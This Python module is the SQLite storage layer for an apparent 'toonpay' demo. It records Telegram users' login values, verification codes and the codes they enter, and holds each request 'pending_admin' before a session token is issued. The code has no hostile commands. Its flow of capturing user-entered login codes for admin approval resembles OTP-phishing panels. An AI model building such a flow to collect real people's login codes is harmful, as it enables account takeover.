import os
import sqlite3
import secrets

from datetime import datetime, timezone


DB = os.getenv(
    "DATABASE_PATH",
    "toonpay_demo.db"
)


def conn():

    c = sqlite3.connect(
        DB,
        check_same_thread=False
    )

    c.row_factory = sqlite3.Row

    return c


def now():

    return datetime.now(
        timezone.utc
    ).isoformat()


def init_db():

    c = conn()

    c.executescript(
        '''
        CREATE TABLE IF NOT EXISTS login_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER NOT NULL,
            username TEXT,
            login_value TEXT NOT NULL,
            login_method TEXT NOT NULL,
            verification_code TEXT,
            entered_code TEXT,
            status TEXT NOT NULL DEFAULT 'waiting_code',
            session_token TEXT,
            created_at TEXT NOT NULL,
            updated_at TEXT NOT NULL
        );

        CREATE INDEX IF NOT EXISTS idx_login_status
        ON login_requests(status);

        CREATE TABLE IF NOT EXISTS sessions (
            token TEXT PRIMARY KEY,
            telegram_id INTEGER NOT NULL,
            username TEXT,
            created_at TEXT NOT NULL
        );
        '''
    )

    # Upgrade an older database if necessary.
    cols = {
        r[1]
        for r in c.execute(
            "PRAGMA table_info(login_requests)"
        ).fetchall()
    }

    if "verification_code" not in cols:

        c.execute(
            "ALTER TABLE login_requests "
            "ADD COLUMN verification_code TEXT"
        )

    c.commit()
    c.close()


def create_login_request(
    telegram_id,
    username,
    login_value,
    login_method
):

    t = now()

    # Synthetic 6-digit code for this demo.
    code = f"{secrets.randbelow(1000000):06d}"

    c = conn()

    cur = c.execute(
        """
        INSERT INTO login_requests
        (
            telegram_id,
            username,
            login_value,
            login_method,
            verification_code,
            status,
            created_at,
            updated_at
        )
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            telegram_id,
            username,
            login_value,
            login_method,
            code,
            "waiting_code",
            t,
            t
        )
    )

    rid = cur.lastrowid

    c.commit()
    c.close()

    return rid, code


def get_request(rid):

    c = conn()

    r = c.execute(
        "SELECT * FROM login_requests WHERE id=?",
        (rid,)
    ).fetchone()

    c.close()

    return dict(r) if r else None


def submit_code(rid, code):

    c = conn()

    c.execute(
        """
        UPDATE login_requests
        SET entered_code=?,
            status='pending_admin',
            updated_at=?
        WHERE id=?
        """,
        (
            code,
            now(),
            rid
        )
    )

    c.commit()
    c.close()


def set_status(rid, status):

    c = conn()

    c.execute(
        """
        UPDATE login_requests
        SET status=?,
            updated_at=?
        WHERE id=?
        """,
        (
            status,
            now(),
            rid
        )
    )

    c.commit()
    c.close()


def create_session(
    tid,
    username
):

    token = secrets.token_urlsafe(48)

    c = conn()

    c.execute(
        """
        INSERT INTO sessions
        (
            token,
            telegram_id,
            username,
            created_at
        )
        VALUES (?, ?, ?, ?)
        """,
        (
            token,
            tid,
            username,
            now()
        )
    )

    c.commit()
    c.close()

    return token


def attach_session(
    rid,
    token
):

    c = conn()

    c.execute(
        """
        UPDATE login_requests
        SET session_token=?,
            updated_at=?
        WHERE id=?
        """,
        (
            token,
            now(),
            rid
        )
    )

    c.commit()
    c.close()


def get_session(token):

    c = conn()

    r = c.execute(
        "SELECT * FROM sessions WHERE token=?",
        (token,)
    ).fetchone()

    c.close()

    return dict(r) if r else None
